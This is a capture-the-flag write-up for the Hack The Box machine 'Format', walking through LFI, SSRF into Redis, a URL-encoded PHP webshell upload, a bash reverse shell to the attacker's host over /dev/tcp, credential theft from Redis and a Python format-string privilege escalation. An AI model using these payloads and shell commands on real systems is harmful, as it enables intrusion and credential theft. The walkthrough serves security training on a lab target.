# Challenge Name

-   **Platform:** Hack The Box
-   **URL:** https://app.hackthebox.com/machines/Format
-   **Difficulty:** Medium
-   **OS:** Linux

## Enumeration

### Port & Service Enumeration

<details>
<summary>masscan</summary>

```
sudo masscan -p1-65535,U:1-65535 --rate=1000 -e tun0 10.10.11.213

Discovered open port 22/tcp on 10.10.11.213
Discovered open port 80/tcp on 10.10.11.213
Discovered open port 3000/tcp on 10.10.11.213
```

</details>

<details>
<summary>nmap</summary>

```
nmap -sC -sV 10.10.11.213

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 c3:97:ce:83:7d:25:5d:5d:ed:b5:45:cd:f2:0b:05:4f (RSA)
|   256 b3:aa:30:35:2b:99:7d:20:fe:b6:75:88:40:a5:17:c1 (ECDSA)
|_  256 fa:b3:7d:6e:1a:bc:d1:4b:68:ed:d6:e8:97:67:27:d7 (ED25519)
80/tcp   open  http    nginx 1.18.0
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0
3000/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://microblog.htb:3000/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

</details>

### Web Enumeration

<details>
<summary>vhost</summary>

```
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain -u http://microblog.htb/

Found: app.microblog.htb Status: 200 [Size: 3976]
Found: sunny.microblog.htb Status: 200 [Size: 3732]
```

</details>

<details>
<summary>dir</summary>

1. `http://microblog.htb/`

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u 'http://microblog.htb/'

(none)
```

2. `http://app.microblog.htb/`

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u 'http://app.microblog.htb/'

/login                (Status: 301) [Size: 169] [--> http://app.microblog.htb/login/]
/register             (Status: 301) [Size: 169] [--> http://app.microblog.htb/register/]
/logout               (Status: 301) [Size: 169] [--> http://app.microblog.htb/logout/]
/dashboard            (Status: 301) [Size: 169] [--> http://app.microblog.htb/dashboard/]
```

3. `http://sunny.microblog.htb/`

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u 'http://app.microblog.htb/'

/images               (Status: 301) [Size: 169] [--> http://sunny.microblog.htb/images/]
/content              (Status: 301) [Size: 169] [--> http://sunny.microblog.htb/content/]
/edit                 (Status: 301) [Size: 169] [--> http://sunny.microblog.htb/edit/]
```

4. `http://microblog.htb:3000/`

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u 'http://microblog.htb:3000/'

/admin                (Status: 303) [Size: 38] [--> /user/login]
/issues               (Status: 303) [Size: 38] [--> /user/login]
/v2                   (Status: 401) [Size: 50]
/explore              (Status: 303) [Size: 41] [--> /explore/repos]
/milestones           (Status: 303) [Size: 38] [--> /user/login]
/cooper               (Status: 200) [Size: 16897]
/notifications        (Status: 303) [Size: 38] [--> /user/login]
```

</details>

## Foothold

### Web → `www-data`

#### Searching for Vulnerabilities

-   the source code for `http://app.microblog.htb/` and `http://sunny.microblog.htb/` can be found at `http://microblog.htb:3000/cooper/microblog`
-   The following code can be found in `/microblog/edit/index.php`, which allows us to add text to a created blog:
    ```php
    if (isset($_POST['txt']) && isset($_POST['id'])) {
        chdir(getcwd() . "/../content");
        $txt_nl = nl2br($_POST['txt']);
        $html = "<div class = \"blog-text\">{$txt_nl}</div>";
        $post_file = **fopen("{$_POST['id']}", "w");**
        fwrite($post_file, $html);
        fclose($post_file);
        $order_file = fopen("order.txt", "a");
        fwrite($order_file, $_POST['id'] . "\n");
        fclose($order_file);
        header("Location: /edit?message=Section added!&status=success");
    }
    ```
-   The file name in which the content of the input field will be saved is passed via `$_POST['id']`. When a blog is accessed, the content is then read from the specified file name:
    ```php
    function fetchPage() {
        chdir(getcwd() . "/content");
        $order = file("order.txt", FILE_IGNORE_NEW_LINES);
        $html_content = "";
        foreach($order as $line) {
            $temp = $html_content;
            $html_content = $temp . "<div class = \"{$line}\">" . **file_get_contents($line)** . "</div>";
        }
        return $html_content;
    }
    ```
    -   `order.txt` contains all file names in the order in which the content is to be displayed on the blog page
    -   `file_get_contents($line)` outputs the content of each file within `order.txt`
-   This makes **LFI (local file inclusion)** possible, but only if we do not have write access to the specified file, as we would otherwise overwrite it. The POST request after adding a new text field on the blog can be intercepted and manipulated with burpsuite. We can get the contents of the `/etc/passwd` by changing the POST parameters as follows:
    ```
    id=/etc/passwd&txt=test
    ```
    - <details>
        <summary>contents of <code>/etc/passwd</code></summary>

        ```    
        root:x:0:0:root:/root:/bin/bash
        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
        bin:x:2:2:bin:/bin:/usr/sbin/nologin
        sys:x:3:3:sys:/dev:/usr/sbin/nologin
        sync:x:4:65534:sync:/bin:/bin/sync
        games:x:5:60:games:/usr/games:/usr/sbin/nologin
        man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
        lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
        mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
        news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
        uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
        proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
        www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
        backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
        list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
        irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
        gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
        nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
        _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
        systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
        systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
        systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
        systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
        cooper:x:1000:1000::/home/cooper:/bin/bash
        redis:x:103:33::/var/lib/redis:/usr/sbin/nologin
        git:x:104:111:Git Version Control,,,:/home/git:/bin/bash
        messagebus:x:105:112::/nonexistent:/usr/sbin/nologin
        sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
        _laurel:x:997:997::/var/log/laurel:/bin/false
        ```
        </details>
- if we do have write permissions, we can also use this to create new files
- The code shows that there are additional functions for so-called pro accounts. An additional `/uploads` directory is created for a blog of a pro user account, in which pro users are granted write permissions:
    ```php
    function provisionProUser() {
        if(isPro() === "true") {
            $blogName = trim(urldecode(getBlogName()));
            system("chmod +w /var/www/microblog/" . $blogName);
            system("chmod +w /var/www/microblog/" . $blogName . "/edit");
            system("cp /var/www/pro-files/bulletproof.php /var/www/microblog/" . $blogName . "/edit/");
            system("mkdir /var/www/microblog/" . $blogName . "/uploads && **chmod 700 /var/www/microblog/" . $blogName . "/uploads**");
            system("chmod -w /var/www/microblog/" . $blogName . "/edit && chmod -w /var/www/microblog/" . $blogName);
        }
        return;
    }
    ```
- we can use the LFI vulnerability to retrieve the nginx configuration by setting the `id` parameter to `/etc/nginx/sites-enabled/default`
    - <details>
        <summary>contents of <code>/etc/nginx/sites-enabled/default</code></summary>
            
        ```yaml
        ##
        # You should look at the following URL's in order to grasp a solid understanding
        # of Nginx configuration files in order to fully unleash the power of Nginx.
        # https://www.nginx.com/resources/wiki/start/
        # https://www.nginx.com/resources/wiki/start/topics/tutorials/config_pitfalls/
        # https://wiki.debian.org/Nginx/DirectoryStructure
        #
        # In most cases, administrators will remove this file from sites-enabled/ and
        # leave it as reference inside of sites-available where it will continue to be
        # updated by the nginx packaging team.
        #
        # This file will automatically load configuration files provided by other
        # applications, such as Drupal or Wordpress. These applications will be made
        # available underneath a path with that package name, such as /drupal8.
        #
        # Please see /usr/share/doc/nginx-doc/examples/ for more detailed examples.
        ##

        # Default server configuration
        #
        server {
            listen 80 default_server;
            listen [::]:80 default_server; 

            # SSL configuration 
            # 
            # listen 443 ssl default_server; 
            # listen [::]:443 ssl default_server; 
            # 
            # Note: You should disable gzip for SSL traffic. 
            # See: https://bugs.debian.org/773332 
            # 
            # Read up on ssl_ciphers to ensure a secure configuration. 
            # See: https://bugs.debian.org/765782 
            # 
            # Self signed certs generated by the ssl-cert package 
            # Don't use them in a production server! 
            # 
            # include snippets/snakeoil.conf; 

            root /var/www/html;

            # Add index.php to the list if you are using PHP 
            index index.html index.htm index.nginx-debian.html; 
            
            server_name _; 
            
            location / { 
                # First attempt to serve request as file, then 
                # as directory, then fall back to displaying a 404. 
                try_files $uri $uri/ =404; 
            }

            # pass PHP scripts to FastCGI server 
            # 
            #location ~ \.php$ { 
            #   include snippets/fastcgi-php.conf;
            #
            #   # With php-fpm (or other unix sockets): 
            #   fastcgi_pass unix:/run/php/php7.4-fpm.sock;  
            #   # With php-cgi (or other tcp sockets):
            #   fastcgi_pass 127.0.0.1:9000; 
            #} 
            
            # deny access to .htaccess files, if Apache's document root 
            # concurs with nginx's one 
            # 
            #location ~ /\.ht { 
            # deny all; 
            #}
        }

        server { 
            listen 80; 
            listen [::]:80; 

            root /var/www/microblog/app; 

            index index.html index.htm index-nginx-debian.html; 
            server_name microblog.htb; 
            
            location / { 
                return 404; 
            } 
            
            location = /static/css/health/ { 
                resolver 127.0.0.1; 
                proxy_pass http://css.microbucket.htb/health.txt; 
            } 

            location = /static/js/health/ { 
                resolver 127.0.0.1; 
                proxy_pass http://js.microbucket.htb/health.txt; 
            } 

            location ~ /static/(.*)/(.*) { 
                resolver 127.0.0.1; 
                proxy_pass http://$1.microbucket.htb/$2; 
            }
        }
        ```

        </details>
- the nginx configuration reveals a misconfiguration, which allows us access the Redis socket through **SSRF (server-side request forgery)**:
    ```yaml
        location ~ /static/(.*)/(.*) { 
	        resolver 127.0.0.1; 
            proxy_pass http://$1.microbucket.htb/$2; 
	}
    ```
    - we can exploit this, e.g. to upgrade a user account to a pro user account

#### Exploitation

1. After a user account (here: username `foo`) has been created, the **SSRF** vulnerability can be exploited to turn it into a pro user. To do this, we can send a forged [HSET request](https://redis.io/commands/hset/) to the Redis socket:
    ```bash
    curl -X "HSET" /static/unix:%2Fvar%2Frun%2Fredis%2Fredis%2Esock:foo%20pro%20true%20/
    ```
    - nginx sets the placeholder for `proxy_pass` accordingly so that the following request is executed:
        ```
        http://unix:/var/run/redis/redis.sock:foo pro true /.microbucket.htb/
        ```
    - the request therefore passes the HSET command `foo pro true` to `redis.sock`, making `foo` a pro user account
2. If you now create a blog with the Pro account, the function `provisionProUser()` is executed, which creates the directory `/uploads` with write permissions. The **LFI** exploit can now be used to upload a webshell `cmd.php` in this directory, which enables commands to be executed via POST parameters. To do that, we can send the following POST request to `/edit`:
    ```
    POST /edit/index.php HTTP/1.1
    Host: foo.microblog.htb
    User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 387
    Origin: http://foo.microblog.htb
    Connection: close
    Referer: http://foo.microblog.htb/edit/
    Cookie: username=o1tg5liv7pp287auh923b9e07s
    Upgrade-Insecure-Requests: 1

    id=/var/www/microblog/foo/uploads/cmd.php&txt=%3c%3f%70%68%70%20%69%66%28%69%73%73%65%74%28%24%5f%52%45%51%55%45%53%54%5b%27%63%6d%64%27%5d%29%29%7b%20%65%63%68%6f%20%22%3c%70%72%65%3e%22%3b%20%24%63%6d%64%20%3d%20%28%24%5f%52%45%51%55%45%53%54%5b%27%63%6d%64%27%5d%29%3b%20%73%79%73%74%65%6d%28%24%63%6d%64%29%3b%20%65%63%68%6f%20%22%3c%2f%70%72%65%3e%22%3b%20%64%69%65%3b%20%7d%3f%3e
    ```
    - The `txt` parameter is the webshell `PHP cmd 2` url-encoded from [revshells.com](https://revshells.com)
3. Now, we can executed commands via `http://foo.microblog.htb/uploads/shell.php?cmd=`. For example, to start a reverse shell:
    
    ```
    http://foo.microblog.htb/uploads/shell.php?cmd=%62%61%73%68%20%2d%63%20%27%2f%62%69%6e%2f%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%36%2f%39%30%30%32%20%30%3e%26%31%27
    ```
    - the `cmd` parameter is URL-encoded `bash -c '/bin/sh -i >& /dev/tcp/<your ip>/9002 0>&1'` for creating a reverse shell
4. We now have reverse shell access for `www-data`.

## Lateral Movement

### `www-data` → `cooper` 🚩

#### Exploitation

1. We can use `redis-cli` to connect to the Redis database:
    ```bash
    redis-cli -s /var/run/redis/redis.sock
    ```
2. The password for the user `cooper` can be found in plain text in the database:
    ```
    redis /var/run/redis/redis.sock> info
    ...
    # Keyspace
    db0:keys=2,expires=0,avg_ttl=0
    ```
    ```
    redis /var/run/redis/redis.sock> select 0
    OK
    ```
    ```
    redis /var/run/redis/redis.sock> keys *
    1) "cooper.dooper:sites"
    2) "cooper.dooper"
    ```
    ```
    redis /var/run/redis/redis.sock> type cooper.dooper
    hash
    ```
    ```
    redis /var/run/redis/redis.sock> hkeys cooper.dooper
    1) "username"
    2) "password"
    3) "first-name"
    4) "last-name"
    5) "pro"
    ```
    ```
    redis /var/run/redis/redis.sock> hget cooper.dooper password
    "zooperdoopercooper"
    ```
3. With the password `zooperdoopercooper` we can log in via SSH as `cooper`. 🚩

## Privilege Escalation

### `cooper` → `root` 🏁

#### Searching for Vulnerabilities

- the `/etc/ssh/sshd_config` shows that `root` is allowed to log in via SSH:
- `sudo -l` shows that `cooper` is allowed to execute the `license` binary as `root`:
    ```
    User cooper may run the following commands on format:
        (root) /usr/bin/license
    ```
- `binwalk license` shows that it is a Python script that can be exploited via the `str.format()` method:
    ```python
    license_key = (prefix + username + "{license.license}" + firstlast).format(license=l)
    ```
    - https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#python-format-string
- The Python source code also contains a suspicious variable `secret`:
    ```python
    secret = [line.strip() for line in open("/root/license/secret")][0]
    ```

#### Exploitation

1. To exploit the vulnerability we found, let's create another user account on the webpage:
    - username: `bar`
    - first name: `{license.init.globals[secret]}`
2. The output of the command `sudo license -p bar` contains the value of the variable `secret`:
    ```
    Plaintext license key:
    ------------------------------------------------------
    microblogbaro-4x'2xqhD"0\G{M+`=~/1:n?JcF3aG]sW,CC,plunCR4ckaBL3Pa$$w0rdbar

    Encrypted license key (distribute to customer):
    ------------------------------------------------------
    gAAAAABlCK4w4Q1DBHF7ZnQGMo_d3_j09GsmbKuS08hZmemMw8O-bTUmAd7vIEirYDRw5fwvCjf5ReNr5_aNwTWY2WK1oYB-S1VOEQYptn99pgb5m8kk-jlHxwVFcHpbONUyzD9TrEDHBMHz_BQPu1XpgPwkpSIeCc1CxYg7bD7nrbHFuMX2hbY=
    ```
    - if you look closely, you can see, that the output for the license key contains the string `unCR4ckaBL3Pa$$w0rd`
3. With the password `unCR4ckaBL3Pa$$w0rd` we can log in via SSH as `root`! 🏁
